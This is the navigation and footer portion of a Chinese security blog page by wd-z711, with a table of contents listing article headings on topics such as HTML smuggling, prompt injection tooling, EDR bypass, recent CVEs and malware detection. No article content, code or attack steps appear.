href="#HTMLSmuggler%EF%BC%9A%E7%BB%95%E8%BF%87IDS%E5%92%8C%E9%80%9A%E8%BF%87HTML%E8%B5%B0%E7%A7%81%E4%BC%A0%E9%80%92%E7%9A%84JS%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-article-text">HTMLSmuggler：绕过IDS和通过HTML走私传递的JS有效负载生成器</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#HTML%E8%B5%B0%E7%A7%81"><span class="toc-article-text">HTML走私</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%B5%B0%E7%A7%81%E6%96%B9%E5%BC%8F1%EF%BC%9AJavascript-Blob"><span class="toc-article-text">走私方式1：Javascript Blob</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%B5%B0%E7%A7%81%E6%96%B9%E5%BC%8F2%EF%BC%9ADataURL"><span class="toc-article-text">走私方式2：DataURL</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#HTMLSmuggler-%E5%B7%A5%E5%85%B7"><span class="toc-article-text">HTMLSmuggler 工具</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Prompt-Injection-for-chatGPT-PromptMap"><span class="toc-article-text">Prompt Injection for chatGPT: PromptMap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Fault-Injection-Reference-Model-FIRM"><span class="toc-article-text">Fault Injection Reference Model (FIRM)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#FI%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">FI漏洞</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#FI%E6%94%BB%E5%87%BB"><span class="toc-article-text">FI攻击</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#FIRM%E6%8F%8F%E8%BF%B0"><span class="toc-article-text">FIRM描述</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8-Rust-%E8%BF%9B%E8%A1%8C%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%BC%80%E5%8F%91"><span class="toc-article-text">使用 Rust 进行模糊测试开发</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CVE-2023-4809%EF%BC%9AFreeBSD-pf-%E7%BB%95%E8%BF%87"><span class="toc-article-text">CVE-2023-4809：FreeBSD pf 绕过</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">漏洞</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#EDR-bypass-%E5%9C%B0%E7%8B%B1%E4%B9%8B%E9%97%A8"><span class="toc-article-text">EDR bypass-地狱之门</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%9C%B0%E7%8B%B1%E4%B9%8B%E9%97%A8%EF%BC%9F"><span class="toc-article-text">什么是地狱之门？</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9C%B0%E7%8B%B1%E4%B9%8B%E9%97%A8%E5%AE%9E%E7%8E%B0"><span class="toc-article-text">地狱之门实现</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CVE-2023-4039%EF%BC%9Agcc-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87"><span class="toc-article-text">CVE-2023-4039：gcc 栈溢出保护绕过</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#HTTP-Shell-MultiPlatform-HTTP-Reverse-Shell"><span class="toc-article-text">HTTP-Shell - MultiPlatform HTTP Reverse Shell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%E5%99%A8"><span class="toc-article-text">恶意软件检测的内存分析器</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-article-text">Web应用程序安全测试自动化工具</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#donut-decryptor"><span class="toc-article-text">donut_decryptor</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E6%8E%A7%E5%88%B6%E6%B5%81%E5%88%86%E6%9E%90"><span class="toc-article-text">反编译原理控制流分析</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%AB%98%E7%BA%A7-root-%E6%A3%80%E6%B5%8B%E5%92%8C%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="toc-article-text">高级 root 检测和绕过技术</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#HeaderLessPE"><span class="toc-article-text">HeaderLessPE</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-JavaScript-%E6%8F%92%E6%A1%A9"><span class="toc-article-text">客户端 JavaScript 插桩</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>

	<!-- copyright -->
	<div>
    <ul class="post-copyright">
      <li class="post-copyright-author">
      <strong>作者:  </strong>wd-z711</a>
      </li>
      <li class="post-copyright-link">
      <strong>文章链接:  </strong>
      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
      </li>
      <li class="post-copyright-license">
        <strong>版权声明:   </strong>
        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
        许可协议。转载请注明出处!
      </li>
    </ul>
  <div>
 	

		


</div><!-- row -->




	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2024 wd-z711
  
      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->

     <!-- <script type="text/javascript">
      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
      
      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
    </script> -->
    </p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
